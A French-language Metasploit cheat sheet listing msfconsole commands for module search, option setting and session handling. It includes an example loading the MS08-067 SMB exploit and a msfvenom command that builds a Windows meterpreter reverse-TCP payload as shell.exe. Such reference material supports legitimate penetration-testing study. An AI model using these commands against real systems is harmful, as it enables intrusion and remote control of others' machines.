
# 🛠️ Metasploit Cheat Sheet

> ✅ Ta référence rapide pour maîtriser Metasploit Framework.

---

## ⚡ Lancer Metasploit
```bash
msfconsole
```

---

## 🧭 Commandes de base

| Commande     | Description                           |
|--------------|---------------------------------------|
| help / ?    | Affiche l’aide de msfconsole         |
| banner      | Affiche une nouvelle bannière        |
| version     | Affiche la version de Metasploit     |
| exit / quit | Quitter Metasploit                   |
| clear       | Nettoyer le terminal                 |

---

## 🔍 Rechercher des modules
```bash
search [mot-clé]
```
Exemple :
```bash
search samba
```

---

## 📦 Utiliser un module
```bash
use [chemin_du_module]
```
Exemple :
```bash
use exploit/windows/smb/ms08_067_netapi
```

---

## 📝 Infos sur un module
```bash
info [chemin_du_module]
```
Ou si le module est déjà chargé :
```bash
info
```

---

## ⚙️ Configurer les options

| Commande                | Description                           |
|-------------------------|---------------------------------------|
| show options           | Affiche les options du module        |
| set [option] [valeur]  | Définit une option                   |
| setg [option] [valeur] | Définit une option globale           |
| unset [option]         | Supprimer la valeur d’une option     |
| unsetg [option]        | Supprimer une option globale         |

Exemple :
```bash
set RHOSTS 192.168.1.10
set RPORT 445
```

---

## 🔎 Afficher les modules

| Commande        | Description                     |
|-----------------|---------------------------------|
| show exploits  | Affiche les exploits disponibles|
| show payloads  | Affiche les payloads disponibles|
| show auxiliary | Affiche les modules auxiliaires|
| show encoders  | Affiche les encoders           |
| show nops      | Affiche les générateurs de NOP |
| show post      | Affiche les modules post-exploit|

---

## 💥 Lancer un exploit
```bash
exploit
```
ou
```bash
run
```

---

## 🎯 Gestion des sessions

| Commande           | Description                      |
|--------------------|----------------------------------|
| sessions          | Liste toutes les sessions       |
| sessions -i [ID]  | Interagir avec une session      |
| sessions -k [ID]  | Terminer une session            |
| background        | Mettre une session en arrière-plan|

---

## 🛠️ Générer un payload avec msfvenom
```bash
msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [fichier]
```
Exemple :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```

---

## 🔄 Mettre à jour Metasploit
```bash
msfupdate
```

---

## 🚀 Astuces utiles

| Commande                | Description                          |
|-------------------------|--------------------------------------|
| jobs                   | Liste les jobs actifs               |
| kill [ID]              | Arrête un job                       |
| resource [fichier.rc]  | Exécute un script automatique       |

---

## 📚 Liens utiles
- [Documentation officielle Metasploit](https://docs.metasploit.com/)
- [Metasploit Unleashed (OffSec)](https://www.offensive-security.com/metasploit-unleashed/)
